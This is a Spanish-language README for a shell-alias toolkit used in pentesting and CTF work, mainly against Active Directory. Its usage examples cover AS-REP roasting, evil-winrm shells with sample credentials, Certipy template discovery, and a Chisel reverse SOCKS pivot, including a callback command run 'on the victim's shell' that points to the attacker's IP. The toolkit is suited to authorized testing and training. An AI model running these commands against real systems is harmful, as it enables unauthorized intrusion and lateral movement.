# Hacking Operations Toolkit v1.0 (Speedrun Edition)

![Version](https://img.shields.io/badge/Version-v1.0-blue.svg)
![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)
![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-lightgrey.svg)
![Maintained](https://img.shields.io/badge/Maintained%3F-yes-brightgreen.svg)

> Un kit de herramientas de shell optimizado para la ejecución rápida en operaciones de pentesting, con un fuerte enfoque en Linux y Active Directory.

Este repositorio centraliza una colección de alias y funciones de shell (`bash`/`zsh`) diseñadas para automatizar y acelerar las tareas más comunes y repetitivas durante una auditoría de seguridad o la resolución de máquinas en plataformas CTF.

---

## Índice

1.  [📜 Descripción](#-descripción)
2.  [✨ Características Clave](#-características-clave)
3.  [⚡ Instalación y Configuración](#-instalación-y-configuración)
4.  [🛠️ Guía de Uso Táctico](#️-guía-de-uso-táctico)
5.  [🤝 Contribuciones](#-contribuciones)
6.  [📄 Licencia](#-licencia)
7.  [⚠️ Advertencia Ética](#️-advertencia-ética)

---

## 📜 Descripción

El objetivo de este toolkit es minimizar el tiempo de tipeo y maximizar el tiempo dedicado al análisis y la explotación. El arsenal es modular, lo que permite añadir o quitar herramientas fácilmente, y está diseñado para ser cargado automáticamente al iniciar una nueva sesión de terminal en Kali Linux.

## ✨ Características Clave

- **Modular y Organizado:** Las herramientas están agrupadas por función en scripts separados para un fácil mantenimiento.
- **Optimizado para Velocidad:** Los alias son cortos, mnemotécnicos y diseñados para las operaciones más frecuentes.
- **Enfoque en AD:** Incluye un conjunto completo de atajos para las herramientas más importantes de pentesting en Active Directory (`Impacket`, `NetExec`, `Certipy`, `BloodHound`, etc.).
- **Flexible:** Las funciones aceptan argumentos para adaptarse a diferentes objetivos y escenarios sin necesidad de modificar el código.
- **Fácil de Instalar:** Configuración rápida con un solo comando para integrar el toolkit en tu shell.

## ⚡ Instalación y Configuración

Este kit está diseñado y probado para **Kali Linux**.

### Requisitos Previos

Asegúrate de tener las siguientes herramientas instaladas.

```bash
# Herramientas del sistema
sudo apt update && sudo apt install -y git zsh python3-pip xclip neo4j

# Herramientas de Python (se instalarán con el siguiente paso)
```

### Paso 1: Clonar el Repositorio
Clona este repositorio en una ubicación permanente, como tu directorio de inicio.
```bash
git clone [https://github.com/iNeenah/Hacking-Set-Up.git](https://github.com/iNeenah/Hacking-Set-Up.git) ~/hacking-toolkit
cd ~/hacking-toolkit
```

### Paso 2: Instalar Dependencias de Python
El arsenal depende de varias librerías de Python. Instálalas usando el archivo `requirements.txt` incluido.
```bash
python3 -m pip install --user -r requirements.txt
```

### Paso 3: Configurar el Entorno
Añade el script principal a la configuración de tu shell para que se cargue automáticamente.

```bash
# Añade la ruta de tu binario de Chisel a tu .zshrc (o .bashrc)
# (Descarga Chisel desde su GitHub si no lo tienes)
echo 'export CHISEL_PATH="~/tools/chisel"' >> ~/.zshrc

# Añade el cargador del toolkit a tu .zshrc
echo -e "\n# Cargar Hacking Operations Toolkit\nsource ~/hacking-toolkit/neenah_ad_toolkit.sh" >> ~/.zshrc

# Aplica los cambios inmediatamente
source ~/.zshrc
```
¡Listo! Tu terminal ahora está equipada con el arsenal completo.

## 🛠️ Guía de Uso Táctico

A continuación, algunos ejemplos de uso de los alias más potentes.

#### Módulo de Reconocimiento
```bash
# Escaneo rápido de puertos comunes de AD en un objetivo
scan-ad 10.10.11.150

# Fuzzing de directorios en un servidor web
fuzz [http://10.10.11.150/FUZZ](http://10.10.11.150/FUZZ)
```

#### Módulo de Active Directory
```bash
# Buscar usuarios vulnerables a AS-REP Roasting
asrep 10.10.11.150 mydomain.local

# Obtener una shell interactiva con credenciales
ewinrm 10.10.11.150 'svc_user' 'P@ssw0rd123!'

# Encontrar plantillas de certificados vulnerables
cp-find 'mydomain.local/svc_user:P@ssw0rd123!' -dc-ip 10.10.11.150
```

#### Módulo de Pivoting
```bash
# Iniciar un servidor Chisel para un proxy reverso
pivot server

# En la shell de la víctima, el siguiente comando ya estará en tu portapapeles:
# ./chisel client <TU_IP>:8888 R:socks
```

## 🤝 Contribuciones
Este es un proyecto personal, pero las sugerencias y pull requests para mejorar las herramientas son bienvenidas.

## 📄 Licencia
Este proyecto está bajo la Licencia MIT. Ver el archivo `LICENSE` para más detalles.

## ⚠️ Advertencia Ética
Este toolkit está diseñado con fines **educativos y para su uso en entornos de hacking ético autorizados** (CTFs, laboratorios personales, auditorías con consentimiento explícito). El uso de estas herramientas en sistemas sin permiso es ilegal. Opera con profesionalismo y responsabilidad.